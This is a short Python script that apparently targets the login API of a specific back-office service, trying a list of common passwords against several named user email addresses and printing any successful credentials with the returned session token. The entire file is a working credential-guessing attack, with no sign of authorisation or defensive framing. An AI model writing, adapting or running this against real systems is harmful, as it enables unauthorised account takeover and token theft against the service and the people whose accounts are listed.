import sys, os
sys.path.insert(0, os.path.abspath("."))
import json, requests

host = "https://backoffice.havano.pro"

passwords_to_try = ["1234", "2324", "password", "Admin@23", "123456", "cashier", "Cashier@123"]
users_to_try = ["cashier@gmail.com", "abc4@gmail.com", "chisipiticashier@legendschisipiti.com", "legendscashier@legendsxuls.com"]

url = f"{host}/api/method/saas_api.www.api.login"

for u in users_to_try:
    for p in passwords_to_try:
        resp = requests.post(url, json={"usr": u, "pwd": p, "timezone": "Africa/Harare"})
        if resp.status_code == 200:
            data = resp.json()
            print(f"SUCCESS LOGIN: user={u}, pass={p} -> token_string={data.get('token_string')}")
            break
